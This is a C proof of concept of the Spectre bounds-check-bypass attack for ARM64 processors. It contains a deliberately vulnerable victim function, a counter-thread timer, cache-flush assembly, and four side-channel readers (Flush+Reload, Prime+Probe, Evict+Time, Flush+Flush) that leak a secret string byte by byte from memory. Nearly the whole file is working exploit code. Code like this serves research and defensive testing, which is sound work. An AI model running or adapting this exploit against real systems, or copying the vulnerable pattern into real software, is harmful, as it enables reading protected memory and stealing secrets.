#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <inttypes.h>

/********************************************************************
Victim code.
********************************************************************/
volatile uint64_t counter = 0;
uint64_t miss_min = 0, flushed_min = 0;
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];
char* secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x) {
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

// Timing and flush methods copied from https://github.com/lgeek/spec_poc_arm
void *inc_counter(void *a) {
	while (1) {
		counter++;
		asm volatile ("DMB SY");
	}
}

static uint64_t timed_read(volatile uint8_t *addr) {
	uint64_t ns = counter;

	asm volatile (
		"DSB SY\n"
		"LDR X5, [%[ad]]\n"
		"DSB SY\n"
		: : [ad] "r" (addr) : "x5");

	return counter - ns;
}

static uint64_t timed_flush(volatile uint8_t *addr) {
	uint64_t ns = counter;

	asm volatile (
		"DSB SY\n"
		"DC CIVAC, %[ad]\n"
		"DSB SY\n"
		: : [ad] "r" (addr));

	return counter - ns;
}

static inline void flush(void *addr) {
	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
	asm volatile("DSB SY");
}

uint64_t measure_latency() {
	uint64_t ns;
	uint64_t min = 0xFFFFF;

	for (int r = 0; r < 300; r++) {
		flush(&array1[0]);
		ns = timed_read(&array1[0]);
		if (ns < min) min = ns;
	}

	return min;
}

uint64_t measure_flush_lat() {
	uint64_t ns;
	uint64_t min = 0xFFFFF;

	for (int r = 0; r < 300; r++) {
		asm volatile (
		"DSB SY\n"
		"DC CIVAC, %[ad]\n"
		"DSB SY\n"
		: : [ad] "r" (&array1[0]));
		ns = timed_flush(&array1[0]);
		if (ns < min) min = ns;
	}

	return min;
}


/********************************************************************
Analysis code
********************************************************************/

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte_FlushReload(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i;
	size_t training_x, x;
	register uint64_t time2;
	// register uint64_t alltime = 0;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	
	for (tries = 1; tries > 0; tries--) {
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			flush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			flush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			time2 = timed_read(&array2[mix_i * 512]);
			// alltime += time2;
			if (time2 <= miss_min && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}
		// printf("average = %"PRIu64"\n", alltime/256);

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
			else if (k < 0 || results[i] >= results[k]) { k = i; }
		}

	}
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte_PrimeProbe(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i;
	size_t training_x, x;
	register uint64_t time2;
	// register uint64_t alltime = 0;

	for (i = 0; i < 256; i++)
		results[i] = 0;

	/* Access all addresses so that they're all in the cache */
	for (i = 0; i < 256; i++) {
		mix_i = ((i * 167) + 13) & 255;
		volatile uint8_t *addr = &array2[mix_i * 512];
		asm volatile (
		"DSB SY\n"
		"LDR X5, [%[ad]]\n"
		"DSB SY\n"
		: : [ad] "r" (addr) : "x5");
	}

	for (tries = 999; tries > 0; tries--) {
		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			flush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			time2 = timed_read(&array2[mix_i * 512]);
			// alltime += time2;
			if (time2 > miss_min && mix_i != array1[tries % array1_size]) {
				results[mix_i]++; /* cache miss - add +1 to score for this value */
			}
		}
		// printf("average = %"PRIu64"\n", alltime/256);

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
			else if (k < 0 || results[i] >= results[k]) { k = i; }
		}

	}
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte_EvictTime(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i;
	size_t training_x, x;
	register uint64_t time2;
	// register uint64_t alltime = 0;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	
	for (tries = 999; tries > 0; tries--) {
		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			flush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		uint64_t ns = counter;
		asm volatile ("DSB SY");
		victim_function(x);
		asm volatile ("DSB SY");
		time2 = counter - ns;
		
		if (time2 <= miss_min && array1[x] != array1[tries % array1_size])
				results[array1[x]]++; /* cache hit - add +1 to score for this value */

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
			else if (k < 0 || results[i] >= results[k]) { k = i; }
		}

	}
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte_FlushFlush(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i;
	size_t training_x, x;
	register uint64_t time2;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	
	for (tries = 999; tries > 0; tries--) {
		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			time2 = timed_flush(&array2[mix_i * 512]);
			if (time2 > flushed_min && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* something flushed - add +1 to score for this value */
		}

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			flush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) { k = j; j = i; }
			else if (k < 0 || results[i] >= results[k]) { k = i; }
		}

	}
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char * * argv) {
	printf("[*] Putting '%s' in memory\n", secret);
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int score[2], len = strlen(secret);
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	pthread_t inc_counter_thread;
	if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
		fprintf(stderr, "Error creating thread\n");
		return 1;
	}
    // let the bullets fly a bit ....
	while (counter < 10000000);
	asm volatile ("DSB SY");

	printf("[*] Flush+Reload\n");
	// printf("[*] Prime+Probe\n");
	// printf("[*] Evict+Time\n");
	// printf("[*] Flush+Flush\n");

	/* THRESHOLD: Minimum time until it's considered a cache miss */
	miss_min = measure_latency();
	if (miss_min == 0) {
		fprintf(stderr, "Unreliable access timing\n");
		exit(EXIT_FAILURE);
	}
	miss_min -= 1;
	printf("[*] miss_min %"PRIu64"\n", miss_min);

	/* THRESHOLD: Minimum time to flush something that is in the cache */
	flushed_min = measure_flush_lat();
	if(flushed_min == 0) flushed_min += 5;
	printf("[*] flushed_min %"PRIu64"\n", flushed_min);

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte_FlushReload(malicious_x++, value, score);
		// readMemoryByte_PrimeProbe(malicious_x++, value, score);
		// readMemoryByte_EvictTime(malicious_x++, value, score);
		// readMemoryByte_FlushFlush(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0],
			(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X='%c' score=%d)", value[1],
			(value[1] > 31 && value[1] < 127 ? value[1] : '?'),
				score[1]);
		printf("\n");
	}
	return (0);
}
